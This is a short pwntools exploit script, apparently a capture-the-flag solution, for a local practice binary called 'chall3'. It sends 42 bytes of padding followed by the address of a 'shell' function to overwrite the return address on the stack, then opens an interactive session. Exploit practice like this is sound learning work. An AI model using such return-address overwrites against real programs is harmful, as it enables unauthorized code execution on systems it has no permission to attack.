#!/usr/bin/python3

from pwn import *

p = process("./chall3")

offset = 42 #we got offset using cyclic
secret_adress = p32(0x080491b2) # the adress of the shell function
payload = b"A"*offset + secret_adress # overwrite the return adress pointer

p.sendline(payload)
p.interactive()
p.close()